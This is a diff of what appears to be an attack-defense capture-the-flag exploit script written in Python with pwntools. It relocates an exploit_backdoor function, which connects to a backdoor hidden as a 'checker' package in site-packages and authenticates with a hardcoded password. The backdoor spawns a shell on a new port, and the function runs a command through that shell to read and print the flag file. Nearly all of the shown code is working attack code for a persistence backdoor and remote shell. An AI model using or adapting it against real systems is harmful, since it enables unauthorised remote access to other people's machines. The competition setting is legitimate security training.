@@ -20,42 +20,7 @@ TICK_DURATION = 300 #in seconds
 SPAWN_SHELL_PORT = 5432
 BACKDOOR_FILE_PATH = '/home/user/.local/lib/python3.12/site-packages/checker'
 BACKDOOR_PASSWORD = "stembajaya7777"
-FLAG_PATH = "/home/user/flag.txt"
-
-def exploit_backdoor(target, portSpawnShell) :
-  try:
-    # spawn shell
-    p = remote(target, portSpawnShell)
-    context.log_level = 'error'
-
-    p.sendlineafter(b"Password: ", BACKDOOR_PASSWORD.encode())
-    p.recvuntil(b"checker active on port: ")
-    port_target = int(p.recvline().strip().decode())
-    p.close()
-    
-    print('='*30)
-    print(f"[+] Backdoor active on port: {target} {port_target}")
-
-    # connect to shell, do the exploit
-    r = remote(target, port_target)
-    context.log_level = 'error'
-
-    # exploit goes here
-    # start
-    r.sendline(f"cat {FLAG_PATH}".encode())
-    r.recvuntil(b"$ ")
-    flag = r.recvline().strip().decode().replace("}.", "}")
-    print(flag)
-    r.close()
-    
-    if FLAG_FORMAT not in flag:
-      raise Exception(f"Flag not found")
-    
-    return flag
-  except Exception as e:
-    print(f"[-] Error: {e} ({target})")
-    return
-  
+FLAG_PATH = "/home/user/flag.txt"  
 
 def exploit(target, port):
   try:
@@ -100,6 +65,42 @@ def exploit(target, port):
   except Exception as e:
     print(f"[-] Error: {e} ({target})")
     return
+
+def exploit_backdoor(target, portSpawnShell) :
+  try:
+    # spawn shell
+    p = remote(target, portSpawnShell)
+    context.log_level = 'error'
+
+    p.sendlineafter(b"Password: ", BACKDOOR_PASSWORD.encode())
+    p.recvuntil(b"checker active on port: ")
+    port_target = int(p.recvline().strip().decode())
+    p.close()
+    
+    print('='*30)
+    print(f"[+] Backdoor active on port: {target} {port_target}")
+
+    # connect to shell, do the exploit
+    r = remote(target, port_target)
+    context.log_level = 'error'
+
+    # exploit goes here
+    # start
+    r.sendline(f"cat {FLAG_PATH}".encode())
+    r.recvuntil(b"$ ")
+    flag = r.recvline().strip().decode().replace("}.", "}")
+    print(flag)
+    r.sendline(b"exit")
+    r.close()
+    
+    if FLAG_FORMAT not in flag:
+      raise Exception(f"Flag not found")
+    
+    return flag
+  except Exception as e:
+    print(f"[-] Error: {e} ({target})")
+    return
+
 
 def process_exploit(target_ip, port):
   try:
